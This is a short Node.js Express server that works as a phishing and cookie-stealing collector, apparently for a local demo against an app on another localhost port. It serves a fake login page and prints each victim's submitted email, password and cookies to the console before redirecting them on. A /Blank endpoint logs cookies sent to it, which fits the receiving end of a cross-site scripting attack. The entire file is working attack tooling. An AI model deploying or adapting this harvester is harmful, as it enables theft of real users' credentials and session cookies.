var express = require ("express");
var fs = require('fs');
var path = require ('path');
var bodyParser = require ('body-parser');
var cookieParser = require ('cookie-parser');

var app = express();
var router = express.Router();

router.post("/Comments", function (req,res){
     res.sendFile(path.join(__dirname,'/login.html'));
});
router.get("/Comments", function (req,res){
    res.sendFile(path.join(__dirname,'/login.html'));
 
});
router.get("/Testing",function (req,res){
    res.sendFile(path.join(__dirname,'/testing.html'));
});
router.get("/ajax",function (req,res){
    res.sendFile(path.join(__dirname,'/ajax.html'));
});
var urlencodedParser = bodyParser.urlencoded({ extended: false });
router.post("/Account/Login", urlencodedParser,function (req,res){
    console.log("==========================================");
    console.log("Usuario: "+ req.body.Email);
    console.log("Password: "+ req.body.Password);
    console.log("Cookies: ");
    console.log (req.headers.cookie);
    res.redirect('http://localhost:49526/Comments');
});
router.get('/Blank',function (req,res){
   console.log("==========================================");
    console.log("Cookies: ");
    console.log (req.headers.cookie);
    res.write(""); 
});

app.use(router);
app.use(express.static(path.join(__dirname,'public')));
app.use (bodyParser.urlencoded( {extended:true,
    type:'application/x-www-form-urlencoded',
    inflate : true}));
app.use(cookieParser());
app.listen(49226, function() {
    console.log("App running at 49226");
});